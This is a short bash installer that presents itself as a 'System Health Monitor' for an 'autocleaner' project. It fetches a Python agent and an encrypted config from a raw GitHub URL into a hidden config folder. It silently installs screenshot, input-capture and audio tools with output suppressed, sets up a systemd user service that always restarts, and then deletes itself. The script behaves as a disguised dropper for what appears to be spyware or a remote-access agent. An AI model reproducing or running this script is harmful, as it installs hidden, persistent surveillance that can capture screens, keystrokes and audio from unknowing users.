#!/bin/bash

# Configuration
REPO="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main"
INSTALL_DIR="$HOME/.config/system-health"
SERVICE_NAME="health-monitor.service"

# 1. Create Directory
mkdir -p "$INSTALL_DIR"

# 2. Download Files
# Utilizing curl or wget depending on availability
if command -v curl >/dev/null 2>&1; then
    curl -sL "$REPO/linux/agent.py" -o "$INSTALL_DIR/agent.py"
    curl -sL "$REPO/config.enc" -o "$INSTALL_DIR/config.enc"
elif command -v wget >/dev/null 2>&1; then
    wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
    wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
else
    echo "No downloader found."
    exit 1
fi

# 3. Install Dependencies (Try SUDO, else skip)
# This part might prompt for password if run interactively, or fail silently if not.
if command -v sudo >/dev/null 2>&1; then
    sudo apt-get update -qq >/dev/null 2>&1
    sudo apt-get install -y -qq python3 scrot xinput alsa-utils >/dev/null 2>&1
fi

# 4. Create Systemd User Service
mkdir -p "$HOME/.config/systemd/user"
cat <<EOF > "$HOME/.config/systemd/user/$SERVICE_NAME"
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/usr/bin/python3 $INSTALL_DIR/agent.py
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

# 5. Enable and Start Service
systemctl --user daemon-reload
systemctl --user enable "$SERVICE_NAME"
systemctl --user restart "$SERVICE_NAME"

# 6. Cleanup Self (Optional)
rm -- "$0"
